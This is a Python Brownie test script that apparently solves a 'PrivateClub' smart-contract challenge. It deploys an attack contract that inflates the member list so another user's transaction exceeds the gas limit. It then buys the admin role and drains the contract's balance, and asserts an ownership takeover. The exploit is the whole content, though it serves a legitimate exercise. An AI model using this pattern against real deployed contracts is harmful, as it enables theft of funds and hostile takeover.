#!/usr/bin/python3
from brownie import PrivateClub, web3, Attack
from colorama import Fore
from scripts.deploy import deploy


# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET

blockGasLimit = 120000


def test_be_member_contract():
    private_club, ownerFriend, user2, user3, user4, attacker = deploy()
    _members = [attacker.address] * private_club.membersCount()
    print(_members)
    old_owner = private_club.owner()

    tx = private_club.becomeMember(_members, {"from": attacker, "value": "3 ether"})
    tx.wait(1)

    # task1: become member of the club and
    # print(private_club.members(attacker, {"from": attacker}))
    assert private_club.members(attacker, {"from": attacker}) == True

    attacking_contract = Attack.deploy(private_club.address, {"from": attacker})
    _members = [attacker.address] * private_club.membersCount()
    amount = private_club.membersCount()

    attacking_contract.attack(
        _members, f"{amount} ether", {"from": attacker, "value": f"{amount} ether"}
    )

    _members.append(attacking_contract.address)
    amount = private_club.membersCount()

    private_club.becomeMember(
        _members, {"from": user4, "value": f"{amount} ether"}
    ).wait(1)

    # print(private_club.members(user4, {"from": attacker}))

    # print(web3.eth.getBlock("latest"))
    # print(web3.eth.getBlock("latest").gasLimit)
    print(f"{green}Gas used by user4: {blue}{web3.eth.getBlock('latest').gasUsed}")
    print(f"{green}Gas limit is:      {blue}{blockGasLimit}{reset}")

    assert web3.eth.getBlock("latest").gasUsed > blockGasLimit

    # withdraw the money from our contract
    attacking_contract.payback({"from": attacker}).wait(1)
    # print(web3.fromWei(attacker.balance(), "ether"))

    private_club.buyAdminRole(
        attacker.address, {"from": attacker, "value": f"10 ether"}
    )

    private_club.adminWithdraw(
        attacker.address, private_club.balance(), {"from": attacker}
    )
    #print(private_club.balance())

    print(f"{blue}Old owner: {green}{old_owner}")
    print(f"{blue}New owner: {red}{private_club.owner()}{reset}")
    print(f"{blue}Attacker : {red}{attacker.address}")
    print(
        f"{blue}Attacker balance: {red}{web3.fromWei(attacker.balance(), 'ether')} ETH"
    )
    #print(attacker.balance())

    assert private_club.owner() == attacker.address
    assert attacker.balance() > 110000000000000000000 - 1


def main():
    test_be_member_contract()
